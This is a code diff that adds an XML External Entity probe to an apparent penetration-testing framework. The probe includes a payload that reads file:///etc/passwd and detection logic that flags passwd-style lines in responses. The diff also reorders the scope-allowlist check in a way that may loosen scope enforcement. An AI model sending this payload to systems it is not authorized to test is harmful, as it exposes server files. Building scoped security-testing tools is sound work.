@@ -19,6 +19,7 @@ CONTENT_DISCOVERY_RESULTS_ARTIFACT_NAME = "content-discovery-results.json"
 NIKTO_RESULTS_ARTIFACT_NAME = "nikto-results.json"
 SQLMAP_RESULTS_ARTIFACT_NAME = "sqlmap-results.json"
 EXTERNAL_OSINT_RESULTS_ARTIFACT_NAME = "external-osint-results.json"
+XXE_RESULTS_ARTIFACT_NAME = "xxe-results.json"
 
 DEFAULT_CONTENT_WORDS = (
     "admin",
@@ -32,6 +33,11 @@ DEFAULT_CONTENT_WORDS = (
     "server-status",
     "test",
 )
+
+XXE_DIRECT_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aegispt [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<aegispt><probe>&xxe;</probe></aegispt>
+"""
 
 CommandRunner = Callable[..., subprocess.CompletedProcess[str]]
 
@@ -67,8 +73,6 @@ def _target_within_scope(scope_allowlist: dict[str, Any] | None, target: str) ->
     scope = scope_allowlist or {}
     if not scope:
         return True
-    if not target_value_is_allowed(scope, target):
-        return False
 
     candidate = normalize_http_target(target)
     candidate_host = _url_host(candidate)
@@ -85,7 +89,7 @@ def _target_within_scope(scope_allowlist: dict[str, Any] | None, target: str) ->
         if _url_host(value) == candidate_host
     ]
     if not url_constraints:
-        return True
+        return target_value_is_allowed(scope, candidate)
 
     candidate_path = urlparse(candidate).path or "/"
     for raw_allowed in url_constraints:
@@ -163,6 +167,206 @@ def _content_wordlist_path(configured_path: str | None, directory: Path) -> Path
         if candidate.exists():
             return candidate
     return _write_default_wordlist(directory)
+
+
+def _xml_endpoint_hints_from_evidence(raw_items: Any) -> list[str]:
+    items = raw_items if isinstance(raw_items, list) else []
+    endpoints: list[str] = []
+    for item in items:
+        if isinstance(item, str):
+            if item.strip():
+                endpoints.append(item.strip())
+            continue
+        if not isinstance(item, dict):
+            continue
+        url = str(item.get("url") or item.get("target") or item.get("endpoint") or "").strip()
+        if not url:
+            continue
+        haystack = " ".join(
+            str(value or "")
+            for value in (
+                item.get("content_type"),
+                item.get("request_content_type"),
+                item.get("response_content_type"),
+                item.get("method"),
+                item.get("request_body"),
+                item.get("body"),
+            )
+        ).lower()
+        path = urlparse(url).path.lower()
+        if (
+            "application/xml" in haystack
+            or "text/xml" in haystack
+            or "<?xml" in haystack
+            or path.endswith((".xml", ".svg"))
+        ):
+            endpoints.append(url)
+    return endpoints
+
+
+def _candidate_xml_endpoints(
+    targets: list[str],
+    *,
+    scope_allowlist: dict[str, Any] | None,
+    xml_endpoints: list[dict[str, Any] | str] | None = None,
+    evidence_records: list[dict[str, Any] | str] | None = None,
+) -> list[str]:
+    candidates: list[str] = []
+    candidates.extend(_xml_endpoint_hints_from_evidence(xml_endpoints or []))
+    candidates.extend(_xml_endpoint_hints_from_evidence(evidence_records or []))
+    candidates.extend(_approved_web_targets(targets, scope_allowlist=scope_allowlist))
+
+    normalized: list[str] = []
+    seen: set[str] = set()
+    for raw_candidate in candidates:
+        candidate = normalize_http_target(str(raw_candidate).strip())
+        if not _target_within_scope(scope_allowlist, candidate):
+            raise ValueError(f"XML endpoint outside scope: {candidate}")
+        if candidate not in seen:
+            seen.add(candidate)
+            normalized.append(candidate)
+    if not normalized:
+        raise ValueError("xxe-probe requires at least one in-scope XML-capable target")
+    return normalized
+
+
+def _xxe_direct_file_read_detected(response_text: str) -> bool:
+    lowered = response_text.lower()
+    return bool(
+        "root:x:0:0:" in lowered
+        or re.search(r"(?m)^[a-z0-9_-]+:x:\d+:\d+:", response_text)
+        or ("/bin/" in lowered and "daemon:" in lowered)
+    )
+
+
+def _xxe_direct_finding(endpoint: str, response_text: str) -> dict[str, Any]:
+    evidence_excerpt = response_text[:1200]
+    return _finding(
+        title="XXE - File Read Possible (Direct)",
+        severity="critical",
+        target=endpoint,
+        summary=(
+            "The approved XML endpoint echoed Unix password-file markers after a "
+            "read-only external entity probe, indicating direct XML External Entity file-read exposure."
+        ),
+        tags=["xxe", "xml", "owasp-wstg", "input_validation"],
+        extra={
+            "probe_type": "direct-file-read",
+            "file_uri": "file:///etc/passwd",
+            "matched_marker": "passwd-style-account-line",
+            "response_excerpt": evidence_excerpt,
+        },
+    )
+
+
+def _xxe_oob_findings(
+    *,
+    endpoint: str,
+    oob_confirmation_refs: list[dict[str, Any]] | None,
+) -> list[dict[str, Any]]:
+    findings: list[dict[str, Any]] = []
+    refs = oob_confirmation_refs if isinstance(oob_confirmation_refs, list) else []
+    for ref in refs:
+        if not isinstance(ref, dict):
+            continue
+        ref_endpoint = str(ref.get("endpoint") or ref.get("target") or endpoint).strip()
+        if ref_endpoint and ref_endpoint != endpoint:
+            continue
+        token = str(ref.get("token") or ref.get("interaction_id") or "oob-interaction").strip()
+        findings.append(
+            _finding(
+                title="XXE - Blind Out-of-Band Detected",
+                severity="critical",
+                target=endpoint,
+                summary=(
+                    "Out-of-band interaction evidence was provided for an approved XML endpoint, "
+                    "indicating blind XML External Entity resolution."
+                ),
+                tags=["xxe", "xml", "oob", "owasp-wstg", "input_validation"],
+                extra={"probe_type": "blind-oob", "interaction_ref": token, "source": "provided-oob-evidence"},
+            )
+        )
+    return findings
+
+
+def execute_xxe_probe(
+    targets: list[str],
+    *,
+    scope_allowlist: dict[str, Any] | None = None,
+    xml_endpoints: list[dict[str, Any] | str] | None = None,
+    evidence_records: list[dict[str, Any] | str] | None = None,
+    oob_confirmation_refs: list[dict[str, Any]] | None = None,
+    timeout_seconds: float = 30.0,
+    client_factory: Callable[..., Any] = httpx_client.Client,
+) -> RunnerExecution:
+    if timeout_seconds <= 0:
+        raise ValueError("timeout_seconds must be greater than zero")
+    endpoints = _candidate_xml_endpoints(
+        targets,
+        scope_allowlist=scope_allowlist,
+        xml_endpoints=xml_endpoints,
+        evidence_records=evidence_records,
+    )
+
+    results: list[dict[str, Any]] = []
+    findings: list[dict[str, Any]] = []
+    stderr_lines: list[str] = []
+    exit_code = 0
+    headers = {"Content-Type": "application/xml", "Accept": "application/xml,text/xml,text/plain,*/*"}
+
+    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
+        for endpoint in endpoints:
+            try:
+                response = client.post(endpoint, content=XXE_DIRECT_PAYLOAD.encode("utf-8"), headers=headers)
+                response_text = response.text or ""
+                detected = _xxe_direct_file_read_detected(response_text)
+                result = {
+                    "endpoint": endpoint,
+                    "status_code": response.status_code,
+                    "probe_type": "direct-file-read",
+                    "detected": detected,
+                    "content_type": response.headers.get("content-type", ""),
+                    "response_excerpt": response_text[:1200],
+                }
+                results.append(result)
+                if detected:
+                    findings.append(_xxe_direct_finding(endpoint, response_text))
+            except httpx_client.HTTPError as exc:
+                exit_code = 1
+                stderr_lines.append(f"{endpoint}: {exc}")
+                results.append({"endpoint": endpoint, "probe_type": "direct-file-read", "status": "error", "error": str(exc)})
+            findings.extend(_xxe_oob_findings(endpoint=endpoint, oob_confirmation_refs=oob_confirmation_refs))
+
+    artifact_payload = {
+        "results": results,
+        "findings": findings,
+        "summary": {
+            "endpoint_count": len(endpoints),
+            "finding_count": len(findings),
+            "direct_file_read_count": sum(1 for result in results if result.get("detected")),
+            "dos_payloads_sent": 0,
+        },
+        "safety": {
+            "dos_payloads_sent": False,
+            "ssrf_chaining": False,
+            "payload_family": "read-only-file-uri",
+        },
+    }
+    return RunnerExecution(
+        tool="xxe-probe",
+        exit_code=exit_code,
+        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
+        stderr="\n".join(line for line in stderr_lines if line),
+        metadata={
+            "status": "ok" if exit_code == 0 else "completed_with_errors",
+            "runner_digest": "workers.web_depth.xxe:v1",
+            "tool_version": "httpx-python",
+            "finding_count": len(findings),
+            "endpoint_count": len(endpoints),
+            "dos_payloads_sent": False,
+        },
+        artifacts=[_json_artifact(XXE_RESULTS_ARTIFACT_NAME, artifact_payload)],
+    )
 
 
 def execute_content_discovery(
